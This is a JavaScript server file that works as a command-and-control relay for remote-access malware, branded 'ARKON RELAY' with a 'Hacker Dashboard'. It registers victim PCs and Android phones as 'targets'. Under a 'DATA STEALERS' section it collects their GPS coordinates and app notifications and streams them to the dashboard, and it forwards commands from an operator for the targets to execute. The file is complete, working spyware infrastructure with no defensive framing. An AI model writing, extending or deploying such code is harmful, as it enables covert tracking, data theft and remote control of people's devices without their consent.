import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import 'dotenv/config'; // Load environment variables

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: { origin: "*" },
    allowEIO3: true // Allow older clients (Android v2.x)
});

// Serve the Hacker Dashboard
app.use(express.static(path.join(__dirname, 'public')));

// Security Check
if (!process.env.AUTH_PASSWORD) {
    console.error("FATAL ERROR: AUTH_PASSWORD environment variable is missing.");
    console.error("Please set it in a .env file or your cloud provider settings.");
    process.exit(1); // Crash connection if insecure
}

// Store connected clients
let pcSocketId = null;
let androidSocketId = null;
const AUTH_PASSWORD = process.env.AUTH_PASSWORD;
const authenticatedClients = new Set();

io.on('connection', (socket) => {
    console.log(`[+] Connection: ${socket.id}`);

    // Identify who is connecting
    socket.on('identify', (type) => {
        if (type === 'pc') {
            pcSocketId = socket.id;
            console.log(`[!] PRIMARY TARGET (PC) CONNECTED: ${socket.id}`);
            io.emit('status', 'ONLINE'); // Tell phone PC is online
        } else if (type === 'android') {
            androidSocketId = socket.id;
            console.log(`[!] MOBILE TARGET (ANDROID) CONNECTED: ${socket.id}`);
            io.emit('status', 'ONLINE');

            // --- DATA STEALERS ---
            socket.on('gps', (data) => {
                console.log(`[+] GPS: ${data.lat}, ${data.lon}`);
                io.emit('gps', data); // Broadcast to dashboard
            });

            socket.on('notification', (data) => {
                console.log(`[+] NOTIF: ${data.app}`);
                io.emit('notification', data); // Broadcast to dashboard
            });

        } else if (type === 'mobile') {
            console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
            if (pcSocketId || androidSocketId) socket.emit('status', 'ONLINE');
        }
    });

    // Authentication Request
    socket.on('login', (password) => {
        if (password === AUTH_PASSWORD) {
            authenticatedClients.add(socket.id);
            socket.emit('login_success');
            console.log(`[V] AUTH SUCCESS: ${socket.id}`);
        } else {
            socket.emit('login_fail');
            console.log(`[X] AUTH FAILED: ${socket.id}`);
        }
    });

    // Relay Commands from Phone -> PC/Android
    socket.on('command', (data) => {
        if (!authenticatedClients.has(socket.id)) {
            console.log(`[!] UNAUTHORIZED COMMAND ATTEMPT: ${socket.id}`);
            return;
        }

        let sent = false;

        if (pcSocketId) {
            console.log(`[>] RELAYING COMMAND TO PC: ${data.action}`);
            io.to(pcSocketId).emit('execute', data);
            sent = true;
        }

        if (androidSocketId) {
            console.log(`[>] RELAYING COMMAND TO ANDROID: ${data.action}`);
            io.to(androidSocketId).emit('execute', data);
            sent = true;
        }

        if (!sent) {
            console.log(`[X] FAILED: NO TARGETS CONNECTED`);
        }
    });

    socket.on('disconnect', () => {
        if (socket.id === pcSocketId) {
            console.log(`[!] PC DISCONNECTED`);
            pcSocketId = null;
        }
        if (socket.id === androidSocketId) {
            console.log(`[!] ANDROID DISCONNECTED`);
            androidSocketId = null;
        }

        if (!pcSocketId && !androidSocketId) {
            io.emit('status', 'OFFLINE');
        }
        authenticatedClients.delete(socket.id);
    });
});

const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, () => {
    console.log(`\n>>> ARKON RELAY ID: [${PORT}] <<<\n`);
});
